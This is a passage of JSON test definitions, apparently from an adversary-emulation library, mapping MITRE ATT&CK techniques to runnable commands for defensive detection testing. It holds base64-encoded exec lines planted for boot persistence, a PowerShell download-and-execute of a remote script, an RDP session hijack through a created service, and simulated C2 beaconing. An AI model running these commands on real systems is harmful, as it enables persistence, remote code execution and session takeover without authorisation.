$origfilename /etc/rc.local && sudo rm $origfilename;fi\n"}}, {"name": "rc.local (FreeBSD)", "auto_generated_guid": "2015fb48-8ab6-4fbf-928b-0b62de5c9476", "description": "Modify rc.local\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\nprintf '%s\\n' '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local\necho 'python3.9 -c \"import os, base64;exec(base64.b64decode(\\\"aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo=\\\"))\"' | sudo tee -a /etc/rc.local\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n", "cleanup_command": "origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi\n"}}]}, "T1027.002": {"name": "Software Packing", "technique_id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062", "external_id": "T1027.002", "data_components": ["File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9"], "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ", "atomic_tests": [{"name": "Binary simply packed by UPX (linux)", "auto_generated_guid": "11c46cd8-e471-450e-acb8-52a1216ae6a4", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "supported_platforms": ["linux"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "path", "default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx"}}, "executor": {"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n", "name": "sh"}}, {"name": "Binary packed by UPX, with modified headers (linux)", "auto_generated_guid": "f06197f8-ff46-48c2-a0c6-afc1b50665e1", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "supported_platforms": ["linux"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "path", "default": "PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed"}}, "executor": {"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n", "name": "sh"}}, {"name": "Binary simply packed by UPX", "auto_generated_guid": "b16ef901-00bb-4dda-b4fc-a04db5067e20", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "supported_platforms": ["macos"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "path", "default": "PathToAtomicsFolder/T1027.002/bin/darwin/test_upx"}}, "executor": {"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n", "name": "sh"}}, {"name": "Binary packed by UPX, with modified headers", "auto_generated_guid": "4d46e16b-5765-4046-9f25-a600d3e65e4d", "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "supported_platforms": ["macos"], "input_arguments": {"bin_path": {"description": "Packed binary", "type": "path", "default": "PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed"}}, "executor": {"command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n", "cleanup_command": "rm /tmp/packed_bin\n", "name": "sh"}}]}, "T1071.001": {"name": "Web Protocols", "technique_id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161", "external_id": "T1071.001", "data_components": ["Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c"], "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ", "atomic_tests": [{"name": "Malicious User Agents - Powershell", "auto_generated_guid": "81c13829-f6c9-45b8-85a6-053366d55297", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}}, "executor": {"command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n", "name": "powershell"}}, {"name": "Malicious User Agents - CMD", "auto_generated_guid": "dc3488b0-08c7-4fea-b585-905c83b48180", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}, "curl_path": {"description": "path to curl.exe", "type": "path", "default": "C:\\Windows\\System32\\Curl.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Curl must be installed on system \n", "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.71.1-win32-mingw\\bin\\curl.exe\" #{curl_path}\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"}], "executor": {"command": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Malicious User Agents - Nix", "auto_generated_guid": "2d7c471a-e887-4b78-b0dc-b0df1f2e0658", "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}}, "executor": {"command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n", "name": "sh"}}]}, "T1059.005": {"name": "Visual Basic", "technique_id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67", "external_id": "T1059.005", "data_components": ["Command Execution", "Process Creation", "Module Load", "Script Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )", "atomic_tests": [{"name": "Visual Basic script execution to gather local computer information", "auto_generated_guid": "1620de42-160a-4fe5-bbaf-d3fef0181ce9", "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.", "supported_platforms": ["windows"], "input_arguments": {"vbscript": {"description": "Path to sample script", "type": "string", "default": "PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sample script must exist on disk at specified location (#{vbscript})", "prereq_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{vbscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs\" -OutFile \"#{vbscript}\""}], "executor": {"command": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n", "cleanup_command": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore", "name": "powershell"}}, {"name": "Encoded VBS code execution", "auto_generated_guid": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa", "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "The 64-bit version of Microsoft Office must be installed\n", "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n", "cleanup_command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null\n", "name": "powershell"}}, {"name": "Extract Memory via VBA", "auto_generated_guid": "8faff437-a114-4547-9a60-749652a03df6", "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n", "supported_platforms": ["windows"], "input_arguments": {"ms_product": {"description": "Maldoc application Word", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "cleanup_command": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1543.002": {"name": "Systemd Service", "technique_id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b", "external_id": "T1543.002", "data_components": ["Command Execution", "Service Modification", "Process Creation", "File Modification", "Service Creation", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--23843cff-f7b9-4659-a7b7-713ef347f547", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`). (Citation: lambert systemd 2022) \n\nService unit files use the following directives to execute system commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives cover execution of commands when a service is started manually by `systemctl`, or on system start if the service is set to automatically start.\n* `ExecReload` directive covers when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives cover when a service is stopped.  \n\nAdversaries may abuse systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files systemd uses upon reboot or starting a service.(Citation: Anomali Rocke March 2019) Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.\n\nThe `.service` file\u2019s `User` directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.(Citation: Rapid7 Service Persistence 22JUNE2016) ", "atomic_tests": [{"name": "Create Systemd Service", "auto_generated_guid": "d9e4f24f-aa67-4c6e-bcbf-85622b697a7c", "description": "This test creates a Systemd service unit file and enables it as a service.\n", "supported_platforms": ["linux"], "input_arguments": {"systemd_service_path": {"description": "Path to systemd service unit file", "type": "path", "default": "/etc/systemd/system"}, "systemd_service_file": {"description": "File name of systemd service unit file", "type": "string", "default": "art-systemd-service.service"}, "execstoppost_action": {"description": "ExecStopPost action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execstoppost-marker"}, "execreload_action": {"description": "ExecReload action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execreload-marker"}, "execstart_action": {"description": "ExecStart action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execstart-marker"}, "execstop_action": {"description": "ExecStop action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execstop-marker"}, "execstartpre_action": {"description": "ExecStartPre action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execstartpre-marker"}, "execstartpost_action": {"description": "ExecStartPost action for Systemd service", "type": "string", "default": "/bin/touch /tmp/art-systemd-execstartpost-marker"}}, "executor": {"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n", "name": "bash"}}, {"name": "Create SysV Service", "auto_generated_guid": "760fe8d2-79d9-494f-905e-a239a3df86f6", "description": "This test creates a SysV service unit file and enables it as a service.\n", "supported_platforms": ["linux"], "input_arguments": {"rc_service_path": {"description": "Path to rc service file", "type": "path", "default": "/usr/local/etc/rc.d"}, "rc_service_file": {"description": "File name of rc service file", "type": "string", "default": "art-test"}}, "executor": {"command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '#' >> #{rc_service_path}/#{rc_service_file}\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file}\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\necho 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file}\necho 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file}\necho '' >> #{rc_service_path}/#{rc_service_file}\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \necho '{' >> #{rc_service_path}/#{rc_service_file}\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\necho '}' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \necho 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file}\nchmod +x #{rc_service_path}/#{rc_service_file}\nservice art-test enable\nservice art-test start\n", "cleanup_command": "sysrc -x art_test_enable\nrm -f #{rc_service_path}/#{rc_service_file}\n", "name": "sh"}}, {"name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.", "auto_generated_guid": "c35ac4a8-19de-43af-b9f8-755da7e89c89", "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n", "supported_platforms": ["linux"], "dependencies": [{"description": "System must be Ubuntu ,Kali OR CentOS.\n", "prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then exit /b 0; else exit /b 1; fi;\n", "get_prereq_command": "echo Please run from Ubuntu ,Kali OR CentOS.\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n", "cleanup_command": "systemctl stop T1543.002\nsystemctl disable T1543.002\nrm -rf /etc/init.d/T1543.002\nsystemctl daemon-reload\n"}}]}, "T1563.002": {"name": "RDP Hijacking", "technique_id": "attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c", "external_id": "T1563.002", "data_components": ["Command Execution", "Process Creation", "Network Traffic Flow", "Logon Session Creation", "Network Traffic Content"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)", "atomic_tests": [{"name": "RDP hijacking", "auto_generated_guid": "a37ac520-b911-458e-8aed-c5f1576d9f46", "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n", "supported_platforms": ["windows"], "input_arguments": {"Session_ID": {"description": "The ID of the session to which you want to connect", "type": "string", "default": "1337"}, "Destination_ID": {"description": "Connect the session of another user to a different session", "type": "string", "default": "rdp-tcp#55"}}, "executor": {"command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n", "cleanup_command": "sc.exe delete sesshijack >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1526": {"name": "Cloud Service Discovery", "technique_id": "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db", "external_id": "T1526", "data_components": ["Cloud Service Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable Cloud Logs](https://attack.mitre.org/techniques/T1562/008).", "atomic_tests": [{"name": "Azure - Dump Subscription Data with MicroBurst", "auto_generated_guid": "1e40bb1d-195e-401e-a86b-c192f55e005c", "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": null}, "password": {"description": "Azure AD password", "type": "string", "default": "T1082Az"}, "output_directory": {"description": "Directory to output results to", "type": "string", "default": "$env:temp\\T1526Test1"}, "subscription_name": {"description": "Azure subscription name to scan", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The Get-AzDomainInfo script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n"}, {"description": "The Az module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Az -Force\n"}], "executor": {"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n", 